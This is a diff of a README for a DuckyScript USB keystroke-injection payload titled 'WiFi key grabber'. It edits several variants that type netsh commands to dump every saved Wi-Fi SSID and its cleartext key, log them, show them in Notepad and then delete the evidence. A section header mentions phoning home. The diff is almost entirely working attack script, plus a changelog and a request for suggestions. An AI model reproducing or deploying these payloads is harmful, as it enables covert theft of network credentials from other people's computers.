@@ -61,7 +61,7 @@ STRING echo ssid: %a%>>log & echo type: %b%>>log & echo auth: %c%>>log & echo ke
 ENTER
 STRING echo If all variables are empty there was no wireless connection>>log
 ENTER
-STRING echo If only the key variable is empty the payload requires UAC>>log
+STRING echo If only the key variable is empty the payload requires UAC, or the authentication type isn't supported>>log
 ENTER
 
 REM FASE 3: Phone home
@@ -101,7 +101,7 @@ STRING del log & exit
 ENTER
 ```
 
-* 'Echo' version;
+* Notepad version;
 ```
 REM Title: WiFi key grabber
 REM Author: SiemH
@@ -127,28 +127,25 @@ STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wl
 ENTER
 STRING set a="%a:~1%"
 ENTER
-REM --> Get raw info and set 'a'
+REM --> Get raw info and save to 'a'
 STRING netsh wlan show profiles %a% key=clear | findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"| findstr /v "broadcast"| findstr /v "Radio">>a
 ENTER
-REM --> Find the Network type in the raw info and set 'b'
-STRING for /f "tokens=3 delims=: "  %a in ('findstr "Network type"  a') do set b=%a
+REM --> Find the Network type in the raw info and save to log
+STRING for /f "tokens=3 delims=: "  %a in ('findstr "Network type"  a') do echo type: %a>>log
 ENTER
-REM --> Find the auth type in the raw info and set 'c'
-STRING for /f "tokens=2 delims=: "  %a in ('findstr " Authentication"  a') do set c=%a
+REM --> Find the auth type in the raw info and save to log
+STRING for /f "tokens=2 delims=: "  %a in ('findstr " Authentication"  a') do echo auth: %a>>log
 ENTER
-REM --> Find the key content in the raw info and set 'd'
-STRING for /f "tokens=3 delims=: "  %a in ('findstr "Key Content"  a') do set d=%a
-ENTER
-REM --> Delete raw info / 'a'
-STRING del a
+REM --> Find the key content in the raw info and save to log
+STRING for /f "tokens=3 delims=: "  %a in ('findstr "Key Content"  a') do echo key: %a>>log
 ENTER
 
 REM FASE 3: Show results and exit
-STRING cls & echo ssid: %a% & echo type: %b% & echo auth: %c% & echo key: %d% & pause & exit
+STRING del a & notepad log & timeout 3 & del log & exit
 ENTER
 ```
 
-* All SSID's echo version (work in progress);
+* All SSID's version (proof of concept);
 ```
 REM Title: WiFi keys grabber
 REM Author: SiemH
@@ -173,17 +170,15 @@ REM FASE 2: Information gathering
 REM --> Find all saved networks
 STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show profile ^| findstr "Profile"') do echo %a>>a
 ENTER
-REM --> Second for command to fix spaces enfront of SSID's
+REM --> Fix spaces enfront of SSID's
 STRING for /f "tokens=1 delims= "  %a in (a) do echo %a>>b
 ENTER
-REM --> Get info for each SSID
-REM Did not refine information further because it wouldn't be in the right order
-REM FIX THIS: Authentication is duplicated
-STRING del a & for /f "tokens=*"  %a in (b) do (netsh wlan show profiles "%a"  key=clear|findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"|findstr /v "broadcast"| findstr /v "Radio">>%a.x)
+REM --> Get keys for each SSID
+STRING del a & for /f "tokens=*"  %a in (b) do (echo %a:>>log & netsh wlan show profiles "%a"  key=clear|findstr "Key Content">>log)
 ENTER
 
 REM FASE 3: Show results and cleanup
-STRING del b & cls & type *.x & del *.x & pause & exit
+STRING del b & notepad log & timeout 3 & del log & exit
 ENTER
 ```
 
@@ -195,6 +190,7 @@ ENTER
 5. Added the STRING set A="%A:~1%" to be able to use SSID's with spaces as well
 6. Removed .txt extensions, made variables and file names lower case, removed unnecessary text from log and added some more comments
 7. Added some spaces, quote interferance; sometimes 'Ä' instead of '"A'
+8. Replaced 'echo' version with 'notepad' because cmd sometimes doesn't buffer long enough
 
 ## Suggestions;
 **If you have any suggestions, write them down here.**
